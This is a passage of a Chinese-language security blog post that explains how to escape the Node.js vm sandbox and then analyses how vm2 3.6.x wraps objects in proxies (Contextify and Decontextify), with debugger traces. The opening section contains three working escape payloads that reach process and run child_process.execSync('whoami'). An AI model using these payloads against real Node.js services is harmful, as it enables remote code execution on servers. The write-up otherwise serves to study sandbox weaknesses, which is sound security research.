class="line"></span><br></pre></td></tr></table></figure><p>下图可以看到，使用这种方式创建的context是没有原型对象的，</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702703726979-7dc2a35a-34b4-49cf-a9af-11be09db5b03.png" alt="image.png"></p><h2 id="caller逃逸"><a href="#caller逃逸" class="headerlink" title="caller逃逸"></a>caller逃逸</h2><p>针对this绑定为null的情况，提出的另一种获取外部变量的方式：arguments.callee.caller<br>本质：它会返回自身所在函数的调用者，想办法让外部调用我们定义的函数（钩子函数），即可逃逸。</p><h3 id="toString方式"><a href="#toString方式" class="headerlink" title="toString方式"></a>toString方式</h3><p>通过字符串拼接触发result.toString方法，使得caller为外部变量，进而逃逸、rce。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 caller逃逸 toString方式</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmd =</span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const acc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (acc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(cmd);</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line"><span class="keyword">let</span> result = script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;trigger toString:&quot;</span>+result);</span><br></pre></td></tr></table></figure><h3 id="Proxy方式"><a href="#Proxy方式" class="headerlink" title="Proxy方式"></a>Proxy方式</h3><p>利用proxy对象的get钩子函数，访问任意属性都会触发get函数，使得caller为外部变量，进而逃逸、rce</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.2 caller逃逸 Proxy方式</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    var proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function (target, propKey, receiver) &#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">      return proxy;</span></span><br><span class="line"><span class="string">&#125;)();`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> proxy = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="comment">// 这里可以看作“.”操作符作为caller</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(proxy.<span class="property">fuck</span>);</span><br></pre></td></tr></table></figure><h3 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况"></a>无回显情况</h3><p>若沙盒执行后的返回结果不可控&#x2F;不打印，导致rce不回显，可以利用有try catch的点，通过报错回显。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.3 caller逃逸 Proxy方式 沙箱返回结果不回显，用catch error捕获</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script =</span><br><span class="line"><span class="string">`(()=&gt;&#123;</span></span><br><span class="line"><span class="string">    var proxy = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function (target, propKey, receiver) &#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">      throw proxy;</span></span><br><span class="line"><span class="string">&#125;)();`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">log</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>方法一：直接用npm下载，本人测试过没有问题，比较方便</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.6.4</span><br></pre></td></tr></table></figure><p>方法二：Github clone源码，然后回退，这里回退的版本是3.6.5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/patriksimek/vm2.git</span><br><span class="line">git reset --hard 7ecabb1</span><br></pre></td></tr></table></figure><p>最终的目录结构如下图所示：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1702631519924-a5f4c0e5-ca13-4a01-b84a-64d3bc440c88.png" alt="image.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>本节主要分析vm2如何利用Proxy代理，实现对上下文的封装，保证沙盒环境安全。</p><ul><li>main.js：底层调用vm的api，实现简单的沙盒执行环境</li><li>contextify.js：封装与解封的核心代码</li><li>cli.js：以命令行运行vm2的文件，不是重点</li><li>sandbox.js：初始化一个沙盒环境，不是重点</li></ul><p>分析vm2如何封装沙盒，主要看main.js和contextify.js两个文件。</p><h3 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h3><p>main.js主要定义了4个类，并且把它们暴露出去：</p><ul><li><strong>VM</strong>：常用模块，包含vm2这个沙箱的主要逻辑，例如VM.run()方法</li><li>NodeVM：相比 VM 类多了对模块加载的支持，可以理解为VM的升级版</li><li>VMScript：预编译模块</li><li>VMError：错误模块</li></ul><p>重点关注VM类，它负责沙箱初始化和运行代码。<br>首先，看<code>VM#constructor</code>函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">options = &#123;&#125;</span>) &#123;</span><br><span class="line"><span class="variable language_">super</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// defaults</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">options</span> = &#123;</span><br><span class="line"><span class="attr">timeout</span>: options.<span class="property">timeout</span>,</span><br><span class="line"><span class="attr">sandbox</span>: options.<span class="property">sandbox</span>,</span><br><span class="line"><span class="attr">compiler</span>: options.<span class="property">compiler</span> || <span class="string">&#x27;javascript&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> host = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_context</span> = vm.<span class="title function_">createContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, <span class="string">&#x27;_internal&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">value</span>: vm.<span class="title function_">runInContext</span>(<span class="string">`(function(require, host) &#123; <span class="subst">$&#123;cf&#125;</span> \n&#125;)`</span>, <span class="variable language_">this</span>.<span class="property">_context</span>, &#123;</span><br><span class="line"><span class="attr">filename</span>: <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/contextify.js`</span>,</span><br><span class="line"><span class="attr">displayErrors</span>: <span class="literal">false</span></span><br><span class="line">&#125;).<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">_context</span>, <span class="built_in">require</span>, host)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare global sandbox</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;object&#x27;</span> !== <span class="keyword">typeof</span> <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">VMError</span>(<span class="string">&quot;Sandbox must be object.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> name <span class="keyword">in</span> <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Contextify</span>.<span class="title function_">globalValue</span>(<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">sandbox</span>[name], name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意两个点，第一个是11行的host，它包含了一些常用对象，后面会知道，host里是给沙盒使用的外部对象。<br>第二个15行，它的逻辑是把contextify.js包装在一个匿名函数里，然后把函数返回结果存入<code>this._internal</code>。<br>其次，看VM#run这个函数，它负责在沙盒中运行危险代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">run</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compiler</span> !== <span class="string">&#x27;javascript&#x27;</span>) &#123;</span><br><span class="line">code = <span class="title function_">_compileToJS</span>(code, <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compiler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = code <span class="keyword">instanceof</span> <span class="title class_">VMScript</span> ? code : <span class="keyword">new</span> <span class="title class_">VMScript</span>(code);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Decontextify</span>.<span class="title function_">value</span>(script.<span class="title function_">compile</span>().<span class="property">_compiled</span>.<span class="title function_">runInContext</span>(<span class="variable language_">this</span>.<span class="property">_context</span>, &#123;</span><br><span class="line"><span class="attr">filename</span>: script.<span class="property">filename</span>,</span><br><span class="line"><span class="attr">displayErrors</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">timeout</span>: <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">timeout</span></span><br><span class="line">&#125;));</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="variable language_">this</span>.<span class="property">_internal</span>.<span class="property">Decontextify</span>.<span class="title function_">value</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 第9行，它返回的是<code>this._internal.Decontextify.value(代码运行结果)</code>，之后会了解到，这是对沙盒里运行的危险代码的返回结果做了一个解封装的操作。<br>main.js的作用就是暴露出这四个类供用户使用，例如在调试代码的第1行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure><h3 id="contextify-js"><a href="#contextify-js" class="headerlink" title="contextify.js"></a>contextify.js</h3><p>contextify.js实际上是代码片段，定义了一系列变量，主要包括两个核心的对象：Contextify 和 Decontextify。<br>其中Contextify用于在沙盒环境中封装对象，Decontextify用于在沙盒环境外解封对象。</p><p>首先看Contextify，它负责在沙盒内部封装对象，根据对象的不同类型，实现了一系列封装对象的方法：</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705223256689-b149e565-43af-4835-b208-c0367cb08c27.png" alt="image.png" style="zoom: 150%;" /><p>先关注Contextify#value，它根据要封装的对象类型，分发给不同的方法去进行对象的封装：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705225904950-0a77ba4b-e22a-40c7-9c07-0c7655012737.png" alt="image.png"><br>审计各个方法的代码，可以发现所有的方法最终都会进到Contextify#object，我们直接看Contextify#object。<br>Contextify#object的逻辑是：创建一个proxy对象，封装传入参数的object，并设置对应的handlers（钩子函数)，然后缓存封装好的代理对象，并返回该对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705223860031-2239bc09-847c-462d-ab94-c8f466d9addd.png" alt="image.png"></p><p>再看它是如何设置handlers的，它把<code>host.Object.assign(&#123;...&#125;, traps, deepTraps)</code>的输出作为handlers其中省略部分是object函数自己设置的钩子函数，traps和deepTraps则是Contextify#objec函数的caller函数设置的钩子函数，而Object.assign的合并规则默认是参数从右向左覆盖：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标对象</span></span><br><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="comment">// 源对象1</span></span><br><span class="line"><span class="keyword">const</span> source1 = &#123; <span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">4</span> &#125;;</span><br><span class="line"><span class="comment">// 源对象2</span></span><br><span class="line"><span class="keyword">const</span> source2 = &#123; <span class="attr">c</span>: <span class="number">5</span>, <span class="attr">d</span>: <span class="number">6</span> &#125;;</span><br><span class="line"><span class="comment">// 将源对象的属性复制到目标对象</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="title class_">Object</span>.<span class="title function_">assign</span>(target, source1, source2);</span><br><span class="line"><span class="comment">// source1 覆盖 source2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);  <span class="comment">// 输出: &#123; a: 1, b: 3, c: 5, d: 6 &#125;</span></span><br></pre></td></tr></table></figure><p>所以钩子函数的优先级是：deepTraps&gt;traps&gt;自定义。<br>再看一下Contextify#object设置的钩子函数，可以发现如果想访问constructor，会返回Object导致无法逃逸：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705225105897-41e34361-13d7-4cdf-9e39-c18a72d69fb4.png" alt="image.png"></p><p>小结：Contextify对象根据待封装对象的类型，调用对应方法进行封装，每个方法最后都会进入到Contextify#object，它返回封装好的代理对象。封装的本质就是给对象套一层代理，代理对象会设置钩子函数来保障安全。</p><p>其次看Decontextify，它负责在沙盒外部解封对象，它同样实现了一系列解封对象的方法：</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705230527774-e44d6492-dd3f-4775-a386-31d47f24c61a.png" alt="image.png" style="zoom:150%;" /><p>出于Contextify和Decontextify代码逻辑的对称性，Decontextify只讲一些需要注意的点。<br>首先是Decontextify#object的逻辑，会发现和Contextify#object非常相似，都是把object参数封装成proxy：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705231151951-9b0ef571-ffe1-4854-bb3f-011902f413e5.png" alt="image.png"></p><p>解封为什么还是要封装成proxy？答案在proxy对象的钩子函数的区别上。<br>实际上所谓解封，就是再套一层代理，代理对象的钩子函数变了，使得对代理的安全限制解除了。<br>可以看到，Decontextify的钩子函数，使得访问constructor会返回外部对象host.Object，而不是Object：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705231582400-d2544c74-732f-480e-957c-03540e075f5e.png" alt="image.png"></p><p>小结：Decontextify对象根据待解封对象的类型，调用对应方法进行解封，每个方法最后都会进入到Decontextify#object，它返回解封后的代理对象。解封的本质还是给对象再套一层代理，代理对象会设置钩子函数去除Contextify带来的限制。</p><p>最后再看一下文件末尾，主要是把Buffer封装成代理对象，然后返回定义好的Contextify、Decontextify等对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">LocalBuffer</span> = <span class="variable language_">global</span>.<span class="property">Buffer</span> = <span class="title class_">Contextify</span>.<span class="title function_">readonly</span>(host.<span class="property">Buffer</span>, &#123;</span><br><span class="line"><span class="attr">allocUnsafe</span>: <span class="keyword">function</span>(<span class="params">size</span>) &#123; <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">alloc</span>(size) &#125;,</span><br><span class="line"><span class="attr">allocUnsafeSlow</span>: <span class="keyword">function</span>(<span class="params">size</span>) &#123; <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">alloc</span>(size) &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line"><span class="title class_">Contextify</span>,</span><br><span class="line"><span class="title class_">Decontextify</span>,</span><br><span class="line"><span class="title class_">Buffer</span>: <span class="title class_">LocalBuffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>这里通过调试触发Buffer的钩子函数的代码，更好地理解vm2的封装与解封的思路。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>);    <span class="comment">//访问并运行Buffer的from方法，将运行结果赋值给a：触发function hook</span></span><br><span class="line">a.<span class="property">i</span> = <span class="function">() =&gt;</span> &#123;&#125;;             <span class="comment">//将a.i设置成一个函数：触发setter hook</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">i</span>);           <span class="comment">//访问对象a的i属性：触发getter hook</span></span><br></pre></td></tr></table></figure><p>首先是沙盒的第一行代码，访问Buffer代理对象的from方法，观察会触发哪些hook。<br>这里最先触发的是Contextify#function#get，先尝试get获取from函数，很好理解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">object(), contextify.js:326</span><br><span class="line">function(), contextify.js:282</span><br><span class="line">value(), contextify.js:449</span><br><span class="line">get(), contextify.js:313</span><br><span class="line">anonymous(), sandbox.js:1</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>前面提到过，Contextify#value用于分发待封装的对象，这里获取到from方法后，交由Contextify#value分发：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705235684569-f6a4e97a-fb50-404d-a774-1e7c04793c7f.png" alt="image.png"><br>由于from是function类型，分发后又回到Contextify#function这个方法中，这里的value已经是from函数了：<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705235909837-6aa57ffb-6fbd-40e5-943c-33b73c3ce7ef.png" alt="image.png"></p><p>最后进入Contextify#object，封装并返回from函数的代理对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705236261758-9f918e99-da04-4393-9d80-ef862b1ae4bd.png" alt="image.png"></p><p>第二个触发的是Contextify#function#apply，它负责在沙盒中调用函数，这里显然是调用刚取到的from方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apply(), contextify.js:288</span><br><span class="line">anonymous(), sandbox.js:1</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>可以看到，它先对context、args解封，再运行fnc.apply获取函数实际返回结果，最后再对返回结果进行封装：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705237355456-2dbb952e-886f-4eaf-861b-507ed4a47998.png" alt="image.png"><br>至此沙盒的第一行代码分析， 可以发现”封装”与”解封”的思想贯穿了整个流程。<br>其次是沙盒的第二行代码，对from函数的返回结果a（代理对象）做set操作，观察会触发哪些hook。<br>这里最先触发的是Contextify#object#set，因为是把匿名函数()&#x3D;&gt;{}赋值给a.i，而a是代理对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">object(), contextify.js:120</span><br><span class="line">function(), contextify.js:81</span><br><span class="line">value(), contextify.js:237</span><br><span class="line">set(), contextify.js:345</span><br><span class="line">anonymous(), sandbox.js:2</span><br><span class="line">runInContext(), vm:133</span><br><span class="line">run(), main.js:204</span><br><span class="line">anonymous(), escape.js:5</span><br><span class="line">Module._compile(), loader:1376</span><br><span class="line">Module._extensions..js(), loader:1435</span><br><span class="line">Module.load(), loader:1207</span><br><span class="line">Module._load(), loader:1023</span><br><span class="line">executeUserEntryPoint(), run_main:135</span><br><span class="line">anonymous(), run_main_module:28</span><br></pre></td></tr></table></figure><p>可以看到，代码先对value（匿名函数）解封，然后再赋值给object[key]完成set操作：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705239994240-e0ba6b2e-a931-4240-a0ae-92d082a51415.png" alt="image.png"></p><p>由于value是一个函数，通过Decontextify#value分发，会进入Decontextify#function，注意这里的钩子函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242090591-5ab5e393-092b-483d-a49c-8ce3a5694859.png" alt="image.png"><br>最后进入Decontextify#object，对钩子函数进行合并，并返回value的代理对象。<br>这里有个问题，value（匿名函数）并没有封装过，在这里却进行了一次解封才赋值给a.i，而变成了代理对象：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705241164551-38a34575-86c1-4e20-9ba6-92f34ef7b11a.png" alt="image.png"></p><p>注意到Decontextify的顺序，value-&gt;function-&gt;object，function会覆盖object的hook：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242824445-716e030f-b7e9-4165-b597-09a006cc7f18.png" alt="image.png"><br>根据上文，解封过的对象a.i，访问其constructor会触发getter，返回外部对象host.Function：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705242975937-1dfc1a30-1fe2-4e4a-a04a-418fecb1fcd8.png" 